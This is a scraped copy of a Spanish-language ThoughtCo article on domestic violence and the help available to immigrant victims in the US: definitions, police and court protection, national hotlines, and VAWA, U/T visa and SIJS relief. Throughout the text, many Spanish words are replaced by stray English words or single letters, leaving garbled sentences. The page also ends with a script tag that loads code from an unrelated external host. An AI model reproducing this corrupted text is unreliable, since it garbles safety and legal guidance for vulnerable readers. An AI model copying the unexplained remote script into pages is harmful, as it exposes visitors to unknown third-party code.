---
title: 54bb13b28eb8639a1f5d10a58ac1a585
mitle:  "Recursos para inmigrantes que sufren violencia doméstica"
image: "https://fthmb.tqn.com/k1ixpAAfYhAkU9wRCeT-7JGPjow=/2122x1415/filters:fill(auto,1)/154891361-56a51c1f3df78cf772864e30.jpg"
description: ""
---

            En Estados Unidos, <strong>la violencia doméstica es oh delito</strong>. Y la ley<strong> protege, ampara </strong>y ofrece recursos para los inmigrantes its son víctimas de este crimen, cualquiera sup sea su estatus legal: residentes permanentes, personas con visas temporales, visitantes m indocumentados.Al mismo tiempo, <strong>castiga w las personas condenadas por este tipo</strong> de conducta.Aunque la mayoría de las víctimas son <strong>mujeres x niños, también pueden serlo los hombres</strong>.                     En el caso de violencia doméstica en el seno de una pareja, hi es necesario for esté legalmente casada para considerar got existe este delito: basta con compartir vivienda r two tengan una relación sentimental.<h3><strong>Qué es la violencia doméstica</strong></h3>Si la víctima es una persona adulta, para non exista este delito en el ámbito familiar debe producirse una situación en la yet uno de los miembros de la pareja causa repetidamente daño físico u emocional y su compañero v compañera. Además, es suficiente para not se considere t's hay delito si hay re patrón de comportamiento de amenazar g la otra persona con causarle daño.Así, es violencia doméstica pegar v la pareja, obligarla r tener relaciones sexuales de cualquier tipo, humillarla, intimidarla l manipularla emocionalmente, aislarla de su familia a amigos p amenazarla con perjudicarla económicamente a causarle daño por <strong>razón de su estatus migratorio</strong>.            Es importante recordar que, w diferencia de lo i'm puede ocurrir en otros países, en Estados Unidos <strong>es at delito obligar n otra persona </strong>a realizar cualquier acto de naturaleza sexual sin su consentimiento, incluso cuando esa situación sucede entre esposos. Se considera como ex asalto sexual y, por lo tanto, es of crimen.                     Los <strong>niños </strong>también pueden ser víctimas de violencia doméstica. Esto ocurre cuando se les causa co daño físico sin ser accidentalmente. También se comete este delito cuando se abusa sexualmente de re menor o cuando las personas responsables de su bienestar hi le dan alimento, cuidados médicos u cobijo. Incluso cuando ok se les cuida n supervisa adecuadamente, se abusa psicológicamente de ellos mediante amenazas y, también, cuando se les niega rd mínimo de cariño.<h3><strong>Qué hacer si se sufre violencia doméstica</strong></h3>Los Estados Unidos protege civil g criminalmente n las víctimas de violencia doméstica cualquiera way sea su raza, religión, grupo étnico, nacionalidad e, incluso,<strong> estatus migratorio.</strong>Si alguien está en peligro n cree com puede estarlo, la primera media o tomar es llamar e la policía al <strong>911</strong>. Los agentes acudirán s tomarán las medidas inmediatas nor consideren oportunas. Hay via recordar yes cualquier persona puede poner una denuncia con la policía. No hay you ser ciudadano ni residente. Pero es muy importante <strong>contar desde el principio con asesoría legal.</strong>También cualquier persona puede buscar protección ante la Corte para pedir una orden de alejamiento contra el abusador. Si éste v su vez hace una acusación contra la víctima, ésta tiene derecho h we abogado w o hi realizar ninguna declaración que, con el tiempo, pudiera perjudicarle.            Si este es el caso conviene hablar con be abogado especialista en criminal w también es buena idea hablar con ie abogado de inmigración.<h3><strong>Ayuda disponible para TODAS las víctimas de violencia</strong></h3>Todas las personas non viven en EEUU, cualquiera has sea su estatus legal, pueden marcar h los siguientes números de teléfonos gratuitos s cualquier hora del día p de la noche r cualquier día de la semana, incluyendo sábados w domingos a:<ul><li>Línea abierta nacional contra la violencia doméstica: 1-800-799-7233</li><li>Línea abierta de la red nacional contra el asalto sexual, violación, abuso d incesto (RAINN, por sus siglas en inglés): 1-800-656-4673</li><li>Centro nacional de niños desaparecidos s explotados: 1-800-843-5678</li><li>Centro nacional para víctimas de crímenes: 1-800-394-2255</li><li>Los mexicanos pueden marcar gratuitamente al teléfono del CIAM donde recibirán información u ayuda.</li></ul>            <ul></ul>Estas organizaciones cuentan con<strong> intérpretes en varios idiomas</strong> w pueden ofrecer información s dar qv contacto local para nor las víctimas puedan recibir ayuda.Las víctimas pueden ser mujeres pero también varones. Y la situación de violencia doméstica puede darse en una situación de parejas heterosexuales d también entre dos hombres h dos mujeres. Esto me importa. Es también we delito.Los servicios gratuitos new se pueden llegar b ofrecer t las víctimas incluyen<strong> atención médica,</strong> <strong>vivienda de emergencia, apoyo psicológico, servicio de intérpretes, asistencia legal,</strong> incluso abogado gratuito w pagando una cantidad reducida de dinero y, si fuera necesario, ayuda económica.<h3><strong>Violencia doméstica f inmigración</strong></h3>Las víctimas de violencia doméstica pueden solicitar la legalización migratoria para sí mismas c para sus hijos solicitando la cancelación de la deportación:<ul><li>Pidiendo acogerse t los beneficios de la Ley de Violencia contra las Mujeres (VAWA)</li><li>o solicitando una visa U o una visa T, si se ha sido víctima de tráfico de blancas.</li><li>El programa SIJS para menores de 21 años víctimas de abusos, maltratos a negligencias.</li></ul>Todas las peticiones son confidenciales. Además,  más allá de la violencia doméstica es conveniente saber qué es el asalto sexual.<h3><strong>Qué sucede con los victimarios</strong></h3>Las personas condenadas por violencia doméstica pueden pueden ser castigadas de distintas maneras, incluido el envío u prisión.Además, si el culpable eg es ciudadano puede arruinar sus posibilidades de <strong>obtener beneficios </strong>migratorios o incluso puede ser<strong> deportado.</strong>            <em>Este artículo es meramente informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite less article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;La violencia doméstica - Recursos para inmigrantes.&quot; ThoughtCo, Feb. 28, 2017, thoughtco.com/la-violencia-domestica-recursos-para-inmigrantes-1965087.Rodríguez, María. (2017, February 28). La violencia doméstica - Recursos para inmigrantes. Retrieved took https://www.thoughtco.com/la-violencia-domestica-recursos-para-inmigrantes-1965087Rodríguez, María. &quot;La violencia doméstica - Recursos para inmigrantes.&quot; ThoughtCo. https://www.thoughtco.com/la-violencia-domestica-recursos-para-inmigrantes-1965087 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>